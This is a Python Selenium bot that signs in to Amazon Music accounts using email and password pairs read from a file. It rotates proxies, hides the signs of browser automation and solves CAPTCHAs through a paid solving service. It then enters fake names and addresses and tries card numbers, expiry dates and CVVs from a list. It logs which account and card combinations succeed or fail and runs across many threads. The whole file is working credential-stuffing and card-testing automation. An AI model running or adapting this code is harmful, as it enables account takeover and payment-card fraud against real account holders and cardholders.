from telnetlib import EC
import names, os, random, string, phonenumbers, warnings
from captcha_solver import CaptchaSolver
from selenium.webdriver import Keys
clear = lambda: os.system('cls')
clear()
from essential_generators import DocumentGenerator
import urllib.request
from glob import iglob
from PIL import Image
from threading import Thread
from colorama import Fore
from selenium import webdriver
from selenium.webdriver.common.by import By
from time import sleep
import random_address
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.wait import WebDriverWait
import phone_iso3166.country as countries
warnings.filterwarnings("ignore", category=DeprecationWarning)
global url1, url2

def get_driver():
    chrome_options = webdriver.ChromeOptions()
    # chrome_options = uc.ChromeOptions()
    with open('vpn.txt', 'r') as e:
        proxy = e.readline()
        e.close()
    with open('vpn.txt', 'r') as e:
        data = e.read().splitlines(True)
        e.close()
    with open('vpn.txt', 'w') as e:
        e.writelines(data[1:])
        e.close()
    with open('vpn.txt', 'a') as e:
        e.write(proxy)
        e.close()
    chrome_options.add_argument('--proxy-server=%s' % proxy)
    print(Fore.RED + 'proxy : ' + Fore.GREEN + proxy)
    # chrome_options.experimental_options["prefs"] = {
    #     "profile.managed_default_content_settings.images": 2,
    #     "profile.managed_default_content_settings.stylesheets": 2,
    #     # "profile.managed_default_content_settings.javascript": 2,
    #     "profile.managed_default_content_settings.geolocation": 2,
    #     "profile.default_content_setting_values.notifications": 2,
    # }
    if headless == 0:
        chrome_options.add_argument("--headless")
    # chrome_options.add_extension('so.crx')
    # chrome_options = uc.ChromeOptions()
    chrome_options.add_argument("--lang=en-US")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--mute-audio")
    chrome_options.add_argument("disable-infobars")
    chrome_options.add_argument("--clear-token-service")
    chrome_options.add_argument('--disable-popup-blocking')
    chrome_options.add_argument("--aggressive-cache-discard")
    chrome_options.add_argument("--disable-cache")
    chrome_options.add_argument("--disable-application-cache")
    chrome_options.add_argument("--disable-offline-load-stale-cache")
    chrome_options.add_argument("--disable-3d-apis")
    chrome_options.add_argument("--disable-gpu-shader-disk-cache")
    chrome_options.add_argument("--media-cache-size=0")
    chrome_options.add_argument("--disk-cache-size=0")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-dev-shm-usage')
    # chrome_options.add_argument('--blink-settings=imagesEnabled=false')
    # chrome_options.add_argument("--user-agent= Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument("--window-size=700,700")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    chrome_options.add_argument("--silent")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    driver = webdriver.Chrome('chromedriver.exe', options=chrome_options)
    # driver = uc.Chrome(options=chrome_options)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    driver.delete_all_cookies()
    return driver
def readEmail():
    with open('Emails.txt', 'r') as e:
        EmailData = e.readline()
        e.close()
    with open('Emails.txt', 'r') as e:
        data = e.read().splitlines(True)
        e.close()
    with open('Emails.txt', 'w') as e:
        e.writelines(data[1:])
        e.close()
    return EmailData
def expand_shadow_element(element, driver):
	shadow_root=driver.execute_script('return arguments[0].shadowRoot', element)
	return shadow_root
def StartLogin(driver, EmailData):
    # try:
        # url1 = random.choice(list(open('URL1.txt', 'r').readlines()))
        # url2 = random.choice(list(open('URL2.txt', 'r').readlines()))
        url1 = open('URL1.txt', 'r').readline()
        url2 = open('URL2.txt', 'r').readline()
        Email, Pass = str(EmailData).split('|')
        driver.get(url1)
        country=url1.split("music.amazon.")[1].split("/")[0]
        print(country)
        # WebDriverWait(driver, 100).until(EC.presence_of_all_elements_located)
        if "Type the characters you see in this image" in driver.page_source:
            letters = string.ascii_lowercase
            result_str = ''.join(random.choice(letters) for i in range(13))
            with open(f"trash/{result_str}.png", "ab") as file:
                f = 0
                while f == 0:
                    try:
                        captcha_img = WebDriverWait(driver, 100).until(
                            lambda driver: driver.find_element(By.CSS_SELECTOR, "div.a-row.a-text-center > img"))
                        file.write(captcha_img.screenshot_as_png)
                        f = 1
                    except:
                        f = 0
            with open("captcha code.txt", "r") as c:
                cap = c.readline()
                solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                raw_data = open(f"trash/{result_str}.png", 'rb').read()
            solving_captcha = solver.solve_captcha(raw_data)
            WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element("id", "captchacharacters")).send_keys(
                solving_captcha)
            sleep(0.1)
            WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element(By.CSS_SELECTOR, value="span > button")).click()
            sleep(0.1)
            os.remove(f'trash/{result_str}.png')

        if 'ap_password' in driver.page_source:
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='email')).send_keys(
                Email)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass, Keys.RETURN)

        else:
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='email')).send_keys(
                Email, Keys.RETURN)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass, Keys.RETURN)
        sleep(0.3)
        if "auth-warning-message-box" in driver.page_source:
            WebDriverWait(driver, 20).until(
                lambda driver: driver.find_element(by=By.NAME, value='password')).clear()
            WebDriverWait(driver, 20).until(
                lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass)
            letters = string.ascii_lowercase
            result_str = ''.join(random.choice(letters) for i in range(15))
            srccaptchavalue = WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element(By.CSS_SELECTOR, "#auth-captcha-image")).get_attribute("src")
            if ('.gif' in srccaptchavalue):
                urllib.request.urlretrieve(srccaptchavalue, "trash/%s.gif" % (result_str))
                frame = Image.open(f'trash/{result_str}.gif')
                nframes = 0
                rep = 0
                numoffile = 1
                while frame:
                    if nframes == 0 or nframes == rep + 7 and nframes < 42:
                        frame.save(f'trash/{result_str}-%s.png' % (numoffile), 'PNG')
                        inf = f'trash/{result_str}-%s.png' % (numoffile)
                        im = Image.open(inf)
                        crop_rectangle = (im.width - 40, 0, im.width, im.height)
                        cropped_im = im.crop(crop_rectangle)
                        cropped_im.save('%s' % inf, 'PNG')
                        numoffile += 1
                        rep = nframes
                    nframes += 1
                    try:
                        frame.seek(nframes)
                    except EOFError:
                        break
                ins = 1
                new_im = Image.new('RGB', (40 * 6, 70), (250, 250, 250))
                numoffile = 1
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 2
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 3
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 4
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 5
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 6
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                new_im.save(f'trash/{result_str}.jpg', "JPEG", quality=80, optimize=True, progressive=True)
                with open("captcha code.txt", "r") as c:
                    cap = c.readline()
                    solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                    raw_data = open(f"trash/{result_str}.jpg", 'rb').read()

                solving_captcha = solver.solve_captcha(raw_data)
                # print(solving_captcha+"   11111111111111111111111111111111111")
                # WebDriverWait(driver, 50).until(EC.presence_of_element_located(
                #     (By.XPATH, '//*[@id="cvf-page-content"]/div/div/div/form/div[2]/div/input'))).send_keys(
                #     solving_captcha[0:6], Keys.RETURN)
                try:
                    WebDriverWait(driver, 100).until(
                        lambda driver: driver.find_element("id", "auth-captcha-guess")).send_keys(
                        solving_captcha)
                    sleep(0.1)
                    WebDriverWait(driver, 100).until(lambda driver: driver.find_element("id", "signInSubmit")).click()
                    # WebDriverWait(driver, 50).until(EC.presence_of_element_located(
                    #     (By.XPATH, '/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/form/div/div/div/div[3]/div[1]/input'))).send_keys(
                    #     solving_captcha[0:6], Keys.RETURN)
                except:
                    print(2222222222222)
                sleep(0.5)
            else:
                letters = string.ascii_lowercase
                result_str = ''.join(random.choice(letters) for i in range(8))
                WebDriverWait(driver, 20).until(
                    lambda driver: driver.find_element(by=By.NAME, value='password')).clear()
                WebDriverWait(driver, 20).until(
                    lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                    Pass)
                with open(f"trash/{result_str}.png", "ab") as file:
                    captcha_img = WebDriverWait(driver, 100).until(
                        lambda driver: driver.find_element(By.CSS_SELECTOR, "#auth-captcha-image"))
                    file.write(captcha_img.screenshot_as_png)
                with open("captcha code.txt", "r") as c:
                    cap = c.readline()
                    solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                    raw_data = open(f"trash/{result_str}.png", 'rb').read()
                solving_captcha = solver.solve_captcha(raw_data)
                WebDriverWait(driver, 100).until(
                    lambda driver: driver.find_element("id", "auth-captcha-guess")).send_keys(
                    solving_captcha)
                sleep(0.1)
                WebDriverWait(driver, 100).until(lambda driver: driver.find_element("id", "signInSubmit")).click()
                sleep(0.2)
                os.remove(f'trash/{result_str}.png')
            sleep(0.3)
        if "auth-error-message-box" in driver.page_source or "forgotpassword/reverification?" in driver.current_url:
            print(
                Fore.LIGHTRED_EX + "[!] Invalid Login, Check Your Email or Password or maybe Account Blocked!" + Fore.RESET)
            with open("AccountBlocked.txt", 'a') as f:
                f.write(Email + "|" + Pass)
            driver.quit()
        sleep(0.3)
        try:
            driver.find_element(By.XPATH,
                                "/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/div/form/div/div[5]/div/a").click()
        except:
            pass

            if "Type the characters you see in this image" in driver.page_source:
                letters = string.ascii_lowercase
                result_str = ''.join(random.choice(letters) for i in range(3))
                with open(f"trash/{result_str}.png", "ab") as file:
                    f = 0
                    while f == 0:
                        try:
                            captcha_img = WebDriverWait(driver, 100).until(
                                lambda driver: driver.find_element(By.CSS_SELECTOR, "div.a-row.a-text-center > img"))
                            file.write(captcha_img.screenshot_as_png)
                            f = 1
                        except:
                            f = 0
                with open("captcha code.txt", "r") as c:
                    cap = c.readline()
                    solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                    raw_data = open(f"trash/{result_str}.png", 'rb').read()
                solving_captcha = solver.solve_captcha(raw_data)
                WebDriverWait(driver, 100).until(
                    lambda driver: driver.find_element("id", "captchacharacters")).send_keys(
                    solving_captcha)
                sleep(0.1)
                WebDriverWait(driver, 100).until(
                    lambda driver: driver.find_element(By.CSS_SELECTOR, value="span > button")).click()
                sleep(0.1)
                os.remove(f'trash/{result_str}.png')

            if 'ap_password'in driver.page_source:
                WebDriverWait(driver, 20).until(
                    lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                    Pass+Keys.RETURN)
            sleep(3)
            if "auth-warning-message-box" in driver.page_source:
                WebDriverWait(driver, 20).until(
                    lambda driver: driver.find_element(by=By.NAME, value='password')).clear()
                WebDriverWait(driver, 20).until(
                    lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                    Pass)
                letters = string.ascii_lowercase
                result_str = ''.join(random.choice(letters) for i in range(15))
                srccaptchavalue = WebDriverWait(driver, 100).until(
                    lambda driver: driver.find_element(By.CSS_SELECTOR, "#auth-captcha-image")).get_attribute("src")
                if ('.gif' in srccaptchavalue):
                    urllib.request.urlretrieve(srccaptchavalue, "trash/%s.gif" % (result_str))
                    frame = Image.open(f'trash/{result_str}.gif')
                    nframes = 0
                    rep = 0
                    numoffile = 1
                    while frame:
                        if nframes == 0 or nframes == rep + 7 and nframes < 42:
                            frame.save(f'trash/{result_str}-%s.png' % (numoffile), 'PNG')
                            inf = f'trash/{result_str}-%s.png' % (numoffile)
                            im = Image.open(inf)
                            crop_rectangle = (im.width - 40, 0, im.width, im.height)
                            cropped_im = im.crop(crop_rectangle)
                            cropped_im.save('%s' % inf, 'PNG')
                            numoffile += 1
                            rep = nframes
                        nframes += 1
                        try:
                            frame.seek(nframes)
                        except EOFError:
                            break
                    ins = 1
                    new_im = Image.new('RGB', (40 * 6, 70), (250, 250, 250))
                    numoffile = 1
                    for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                        img = Image.open(fn)
                        if ins == 1:
                            new_im.paste(img, (0, 0))
                        if ins == 2:
                            new_im.paste(img, (40, 0))
                        if ins == 3:
                            new_im.paste(img, (40 * 2, 0))
                        if ins == 4:
                            new_im.paste(img, (40 * 3, 0))
                        if ins == 5:
                            new_im.paste(img, (40 * 4, 0))
                        if ins == 6:
                            new_im.paste(img, (40 * 5, 0))
                        ins += 1
                    numoffile = 2
                    for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                        img = Image.open(fn)
                        if ins == 1:
                            new_im.paste(img, (0, 0))
                        if ins == 2:
                            new_im.paste(img, (40, 0))
                        if ins == 3:
                            new_im.paste(img, (40 * 2, 0))
                        if ins == 4:
                            new_im.paste(img, (40 * 3, 0))
                        if ins == 5:
                            new_im.paste(img, (40 * 4, 0))
                        if ins == 6:
                            new_im.paste(img, (40 * 5, 0))
                        ins += 1
                    numoffile = 3
                    for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                        img = Image.open(fn)
                        if ins == 1:
                            new_im.paste(img, (0, 0))
                        if ins == 2:
                            new_im.paste(img, (40, 0))
                        if ins == 3:
                            new_im.paste(img, (40 * 2, 0))
                        if ins == 4:
                            new_im.paste(img, (40 * 3, 0))
                        if ins == 5:
                            new_im.paste(img, (40 * 4, 0))
                        if ins == 6:
                            new_im.paste(img, (40 * 5, 0))
                        ins += 1
                    numoffile = 4
                    for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                        img = Image.open(fn)
                        if ins == 1:
                            new_im.paste(img, (0, 0))
                        if ins == 2:
                            new_im.paste(img, (40, 0))
                        if ins == 3:
                            new_im.paste(img, (40 * 2, 0))
                        if ins == 4:
                            new_im.paste(img, (40 * 3, 0))
                        if ins == 5:
                            new_im.paste(img, (40 * 4, 0))
                        if ins == 6:
                            new_im.paste(img, (40 * 5, 0))
                        ins += 1
                    numoffile = 5
                    for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                        img = Image.open(fn)
                        if ins == 1:
                            new_im.paste(img, (0, 0))
                        if ins == 2:
                            new_im.paste(img, (40, 0))
                        if ins == 3:
                            new_im.paste(img, (40 * 2, 0))
                        if ins == 4:
                            new_im.paste(img, (40 * 3, 0))
                        if ins == 5:
                            new_im.paste(img, (40 * 4, 0))
                        if ins == 6:
                            new_im.paste(img, (40 * 5, 0))
                        ins += 1
                    numoffile = 6
                    for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                        img = Image.open(fn)
                        if ins == 1:
                            new_im.paste(img, (0, 0))
                        if ins == 2:
                            new_im.paste(img, (40, 0))
                        if ins == 3:
                            new_im.paste(img, (40 * 2, 0))
                        if ins == 4:
                            new_im.paste(img, (40 * 3, 0))
                        if ins == 5:
                            new_im.paste(img, (40 * 4, 0))
                        if ins == 6:
                            new_im.paste(img, (40 * 5, 0))
                        ins += 1
                    new_im.save(f'trash/{result_str}.jpg', "JPEG", quality=80, optimize=True, progressive=True)
                    with open("captcha code.txt", "r") as c:
                        cap = c.readline()
                        solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                        raw_data = open(f"trash/{result_str}.jpg", 'rb').read()

                    solving_captcha = solver.solve_captcha(raw_data)
                    # print(solving_captcha+"   11111111111111111111111111111111111")
                    # WebDriverWait(driver, 50).until(EC.presence_of_element_located(
                    #     (By.XPATH, '//*[@id="cvf-page-content"]/div/div/div/form/div[2]/div/input'))).send_keys(
                    #     solving_captcha[0:6], Keys.RETURN)
                    try:
                        WebDriverWait(driver, 100).until(
                            lambda driver: driver.find_element("id", "auth-captcha-guess")).send_keys(
                            solving_captcha)
                        sleep(0.1)
                        WebDriverWait(driver, 100).until(
                            lambda driver: driver.find_element("id", "signInSubmit")).click()
                        # WebDriverWait(driver, 50).until(EC.presence_of_element_located(
                        #     (By.XPATH, '/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/form/div/div/div/div[3]/div[1]/input'))).send_keys(
                        #     solving_captcha[0:6], Keys.RETURN)
                    except:
                        print(2222222222222)
                    sleep(0.5)
                else:
                    letters = string.ascii_lowercase
                    result_str = ''.join(random.choice(letters) for i in range(8))
                    WebDriverWait(driver, 20).until(
                        lambda driver: driver.find_element(by=By.NAME, value='password')).clear()
                    WebDriverWait(driver, 20).until(
                        lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                        Pass)
                    with open(f"trash/{result_str}.png", "ab") as file:
                        captcha_img = WebDriverWait(driver, 100).until(
                            lambda driver: driver.find_element(By.CSS_SELECTOR, "#auth-captcha-image"))
                        file.write(captcha_img.screenshot_as_png)
                    with open("captcha code.txt", "r") as c:
                        cap = c.readline()
                        solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                        raw_data = open(f"trash/{result_str}.png", 'rb').read()
                    solving_captcha = solver.solve_captcha(raw_data)
                    WebDriverWait(driver, 100).until(
                        lambda driver: driver.find_element("id", "auth-captcha-guess")).send_keys(
                        solving_captcha)
                    sleep(0.1)
                    WebDriverWait(driver, 100).until(lambda driver: driver.find_element("id", "signInSubmit")).click()
                    sleep(0.2)
                    os.remove(f'trash/{result_str}.png')
                sleep(0.3)
            if "auth-error-message-box" in driver.page_source or "forgotpassword/reverification?" in driver.current_url:
                print(
                    Fore.LIGHTRED_EX + "[!] Invalid Login, Check Your Email or Password or maybe Account Blocked!" + Fore.RESET)
                with open("AccountBlocked.txt", 'a') as f:
                    f.write(Email + "|" + Pass)
                driver.quit()
            sleep(0.3)
            try:
                driver.find_element(By.XPATH,
                                    "/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/div/form/div/div[5]/div/a").click()
            except:
                pass

                if "Type the characters you see in this image" in driver.page_source:
                    letters = string.ascii_lowercase
                    result_str = ''.join(random.choice(letters) for i in range(3))
                    with open(f"trash/{result_str}.png", "ab") as file:
                        f = 0
                        while f == 0:
                            try:
                                captcha_img = WebDriverWait(driver, 100).until(
                                    lambda driver: driver.find_element(By.CSS_SELECTOR,
                                                                       "div.a-row.a-text-center > img"))
                                file.write(captcha_img.screenshot_as_png)
                                f = 1
                            except:
                                f = 0
                    with open("captcha code.txt", "r") as c:
                        cap = c.readline()
                        solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                        raw_data = open(f"trash/{result_str}.png", 'rb').read()
                    solving_captcha = solver.solve_captcha(raw_data)
                    WebDriverWait(driver, 100).until(
                        lambda driver: driver.find_element("id", "captchacharacters")).send_keys(
                        solving_captcha)
                    sleep(0.1)
                    WebDriverWait(driver, 100).until(
                        lambda driver: driver.find_element(By.CSS_SELECTOR, value="span > button")).click()
                    sleep(0.1)
                    os.remove(f'trash/{result_str}.png')
            if 'ap_password'in driver.page_source:
                WebDriverWait(driver, 20).until(
                    lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                    Pass+Keys.RETURN)

            #Start Create
            sleep(3)
            try:
                if 'country-continue-button' in driver.page_source:
                    driver.find_element(By.XPATH, '//input[@type="submit" and @class="a-button-input"]').click()

                elif "a-button a-button-primary continueButton" in driver.page_source:
                    driver.find_element(By.XPATH, '//*[@id="a-popover-1"]/div/div[2]/span/span/span/input').click()

                lines = open("PinCode.txt", 'r').read().splitlines()
                ZipCode, City, phone_number, address = str(random.choice(lines)).split('|')
                personName=names.get_full_name()
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME,
                                                                                   value='address-ui-widgets-enterAddressFullName')).send_keys(personName)
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME,
                                                                                   value='address-ui-widgets-enterAddressPhoneNumber')).send_keys(
                    "+" + phone_number.strip())
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME,
                                                                                   value='address-ui-widgets-enterAddressLine1')).send_keys(
                    address.strip())
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME,
                                                                                   value='address-ui-widgets-enterAddressPostalCode')).send_keys(
                    ZipCode.strip())
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME,
                                                                                   value='address-ui-widgets-enterAddressCity')).send_keys(
                    City.strip())
                main = DocumentGenerator()
                sentence = main.sentence()
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME,
                                                                                   value='address-ui-widgets-addr-details-address-instructions')).send_keys(
                    sentence)

                WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.XPATH,
                                                                                   '//input[@type="submit" and @class="a-button-input" and @aria-labelledby="address-ui-widgets-form-submit-button-announce"]')).click()

                WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME,
                                                                                   value='address-ui-widgets-saveOriginalOrSuggestedAddress')).click()
                sleep(3)
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.XPATH, value='//*[@id="agree-button"]/span/a')).click()

            except:
                pass

            driver.get(url2)

            lines = open("Visa.txt", 'r').read().splitlines()
            line=str(random.choice(lines)).split('|')
            Cardumber , month , year , ccv = line
            # print(Cardumber)
            sleep(5)

            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME,value='ppw-accountHolderName')).send_keys(personName)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME,value='addCreditCardNumber')).send_keys(Cardumber)
            select = Select(driver.find_element(By.NAME, 'ppw-expirationDate_month'))
            select.select_by_visible_text(str(month))
            select = Select(driver.find_element(By.NAME, 'ppw-expirationDate_year'))
            select.select_by_value(str(year))
            try:
                WebDriverWait(driver, 1).until(lambda driver: driver.find_element(by=By.NAME,value='addCreditCardVerificationNumber')).send_keys(ccv)
            except:
                pass
            sleep(1)
            WebDriverWait(driver, 1).until(lambda driver: driver.find_element(by=By.NAME,value='ppw-widgetEvent:AddCreditCardEvent')).click()

            alert=WebDriverWait(driver, 1).until(lambda driver: driver.find_element(by=By.XPATH,value='/html/body/div[1]/div/div[2]/div/div/div[2]/div[1]/div/div[4]/div/div/div/div/div[2]/div/div[1]/form/div[1]')).get_attribute("class")

            try:
                if alert == "a-row a-spacing-base":
                    with open('FailedEmail.txt', 'a') as f:
                            f.write(Email + "|" + str(Pass).strip()+"|"+str(line).strip()+"\n")
                            print(Fore.RED + "[=] Failed Email >>> " + Email + Fore.RESET)

            except:
                with open('SuccessEmail.txt', 'a') as f:
                    f.write(Email + "|" + str(Pass).strip()+"|"+str(line).strip()+"\n")
                    print(Fore.GREEN + "[=] Success Email >>> " + Email + Fore.RESET)
                while "applyPromoSection" in driver.page_source:
                    sleep(1)



# except:
    #     pass

def main():
    while True:
            driver = get_driver()
            EmailData = readEmail()
            StartLogin(driver, EmailData)



def cls(): os.system('cls' if os.name == 'nt' else 'clear')


def logo():
    cls()
    print(Fore.WHITE + '''

                            ────────────────────────────────────────────────────────────
                            ─██████──████████────████████████████──────██████████████───
                            ─██░░██──██░░░░██────██░░░░░░░░░░░░██──────██░░░░░░░░░░██───
                            ─██░░██──██░░████────██░░████████░░██──────██░░██████░░██───
                            ─██░░██──██░░██──────██░░██────██░░██──────██░░██──██░░██───
                            ─██░░██████░░██──────██░░████████░░██──────██░░██████░░████─
                            ─██░░░░░░░░░░██──────██░░░░░░░░░░░░██──────██░░░░░░░░░░░░██─
                            ─██░░██████░░██──────██░░██████░░████──────██░░████████░░██─
                            ─██░░██──██░░██──────██░░██──██░░██────────██░░██────██░░██─
                            ─██░░██──██░░████────██░░██──██░░██████────██░░████████░░██─
                            ─██░░██──██░░░░██────██░░██──██░░░░░░██────██░░░░░░░░░░░░██─
                            ─██████──████████────██████──██████████────████████████████─
                            ────────────────────────────────────────────────────────────
    \n\n\n''')


if __name__ == '__main__':
    logo()
    # This code won't run if this file is imported.
    print("[+] pleas enter number of threads..")
    number_of_threads = input()
    # print("[+] if you need change language enter >> 1 ")
    # try:
    #     AskLang = int(input())
    # except:
    #     AskLang = 0
    print("[+] to non headless enter >> 1 ")
    try:
        headless = int(input())
    except:
        headless = 0


    def func():
        try:
            main()
        except:
            pass

    for number in range(int(number_of_threads)):
        t = Thread(target=func)
        t.start()
        sleep(1)

